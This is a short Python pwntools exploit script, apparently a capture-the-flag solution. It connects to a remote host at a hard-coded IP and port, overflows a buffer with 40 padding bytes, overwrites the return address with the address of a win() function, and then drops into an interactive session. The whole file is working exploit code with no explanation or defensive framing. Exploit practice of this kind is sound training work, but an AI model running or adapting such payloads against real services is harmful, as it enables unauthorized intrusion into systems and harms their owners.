from pwn import *

p = remote ('168.119.123.141', 8080)
print (p.recvuntil (b'then......\n'))

payload = b''
payload += b'a'*40
# win() address
payload += p64 (0x4011b6)

p.sendline (payload)
p.interactive ()
